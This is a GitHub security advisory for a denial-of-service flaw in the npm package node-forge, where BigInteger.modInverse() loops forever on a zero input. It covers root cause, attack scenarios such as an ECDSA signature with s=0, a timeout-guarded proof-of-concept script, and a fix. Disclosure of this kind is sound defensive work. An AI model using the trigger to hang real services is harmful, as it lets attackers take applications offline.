# [H] Forge has Denial of Service via Infinite Loop in BigInteger.modInverse() with Zero Input

## Summary
Severity: High
Advisory: GHSA-5m6q-g25r-mvwx
CVE: CVE-2026-33891
CWE: CWE-835
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-5m6q-g25r-mvwx
Type: github-advisory

## Affected
- npm: `node-forge` — affected >=0 <1.4.0

## Details
## Summary

A Denial of Service (DoS) vulnerability exists in the node-forge library due to an infinite loop in the BigInteger.modInverse() function (inherited from the bundled jsbn library). When modInverse() is called with a zero value as input, the internal Extended Euclidean Algorithm enters an unreachable exit condition, causing the process to hang indefinitely and consume 100% CPU.
Affected Package

Package name: node-forge (npm: node-forge)
Repository: https://github.com/digitalbazaar/forge
Affected versions: All versions (including latest)
Affected file: lib/jsbn.js, function bnModInverse()
Root cause component: Bundled copy of the jsbn (JavaScript Big Number) library

## Vulnerability Details

Type: Denial of Service (DoS)
CWE: CWE-835 (Loop with Unreachable Exit Condition)
Attack vector: Network (if the application processes untrusted input that reaches modInverse)
Privileges required: None
User interaction: None
Impact: Availability (process hangs indefinitely)
Suggested CVSS v3.1 score: 5.3–7.5 (depending on the context of usage)

## Root Cause Analysis

The BigInteger.prototype.modInverse(m) function in lib/jsbn.js implements the Extended Euclidean Algorithm to compute the modular multiplicative inverse of this modulo m.
Mathematically, the modular inverse of 0 does not exist — gcd(0, m) = m ≠ 1 for any m > 1. However, the implementation does not check whether the input value is zero before entering the algorithm's main loop. When this equals 0, the algorithm's loop condition is never satisfied for termination, resulting in an infinite loop.
The relevant code path in lib/jsbn.js:
```js
javascriptfunction bnModInverse(m) {
  // ... setup ...
  // No check for this == 0
  // Enters Extended Euclidean Algorithm loop that never terminates when this == 0
}
```

## Attack Scenario

Any application using node-forge that passes attacker-controlled or untrusted input to a code path involving modInverse() is vulnerable. Potential attack surfaces include:

DSA/ECDSA signature verification — A crafted signature with s = 0 would trigger s.modInverse(q), causing the verifier to hang.
Custom RSA or Diffie-Hellman implementations — Applications performing modular arithmetic with user-supplied parameters.
Any cryptographic protocol where an attacker can influence a value that is subsequently passed to modInverse().

A single malicious request can cause the Node.js event loop to block indefinitely, rendering the entire application unresponsive.

## Proof of Concept

Environment Setup
```bash
mkdir forge-poc && cd forge-poc
npm init -y
npm install node-forge
```
Reproduction (poc.js)
A single script that safely detects the vulnerability using a child process with timeout. The parent process is never at risk of hanging.
```bash
mkdir forge-poc && cd forge-poc
npm init -y
npm install node-forge
# Save the script below as poc.js, then run:
node poc.js
```
```javascript
'use strict';
const { spawnSync } = require('child_process');

const childCode = `
  const forge = require('node-forge');
  // jsbn may not be auto-loaded; try explicit require if needed
  if (!forge.jsbn) {
    try { require('node-forge/lib/jsbn'); } catch(e) {}
  }
  if (!forge.jsbn || !forge.jsbn.BigInteger) {
    console.error('ERROR: forge.jsbn.BigInteger not available');
    process.exit(2);
  }
  const BigInteger = forge.jsbn.BigInteger;
  const zero = new BigInteger('0', 10);
  const mod = new BigInteger('3', 10);
  // This call should throw or return 0, but instead loops forever
  const inv = zero.modInverse(mod);
  console.log('returned: ' + inv.toString());
`;

console.log('[*] Testing: BigInteger(0).modInverse(3)');
console.log('[*] Expected: throw an error or return quickly');
console.log('[*] Spawning child process with 5s timeout...');
console.log();

const result = spawnSync(process.execPath, ['-e', childCode], {
  encoding: 'utf8',
  timeout: 5000,
});

if (result.error && result.error.code === 'ETIMEDOUT') {
  console.log('[VULNERABLE] Child process timed out after 5s');
  console.log('  -> modInverse(0, 3) entered an infinite loop (DoS confirmed)');
  process.exit(0);
}

if (result.status === 2) {
  console.log('[ERROR] Could not access BigInteger:', result.stderr.trim());
  console.log('  -> Check your node-forge installation');
  process.exit(1);
}

if (result.status === 0) {
  console.log('[NOT VULNERABLE] modInverse returned:', result.stdout.trim());
  process.exit(1);
}

console.log('[NOT VULNERABLE] Child exited with error (status ' + result.status + ')');
if (result.stderr) console.log('  stderr:', result.stderr.trim());
process.exit(1);
```
Expected Output
```
[*] Testing: BigInteger(0).modInverse(3)
[*] Expected: throw an error or return quickly
[*] Spawning child process with 5s timeout...

[VULNERABLE] Child process timed out after 5s
  -> modInverse(0, 3) entered an infinite loop (DoS confirmed)
Verified On
```

node-forge v1.3.1 (latest at time of writing)
Node.js v18.x / v20.x / v22.x
macOS / Linux / Windows

## Impact

Availability: An attacker can cause a complete Denial of Service by sending a single crafted input that reaches the modInverse() code path. The Node.js process will hang indefinitely, blocking the event loop and making the application unresponsive to all subsequent requests.
Scope: node-forge is a widely used cryptographic library with millions of weekly downloads on npm. Any application that processes untrusted cryptographic parameters through node-forge may be affected.

## Suggested Fix

Add a zero-value check at the entry of bnModInverse() in lib/jsbn.js:
```javascript
function bnModInverse(m) {
  var ac = m.isEven();
  // Add this check:
  if (this.signum() == 0) {
    throw new Error('BigInteger has no modular inverse: input is zero');
  }
  // ... rest of the existing implementation ...
}
```
Alternatively, return BigInteger.ZERO if that behavior is preferred, though throwing an error is more mathematically correct and consistent with other BigInteger implementations (e.g., Java's BigInteger.modInverse() throws ArithmeticException).

## References
- https://github.com/digitalbazaar/forge/security/advisories/GHSA-5m6q-g25r-mvwx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33891
- https://github.com/digitalbazaar/forge/commit/9bb8d67b99d17e4ebb5fd7596cd699e11f25d023
- https://github.com/digitalbazaar/forge
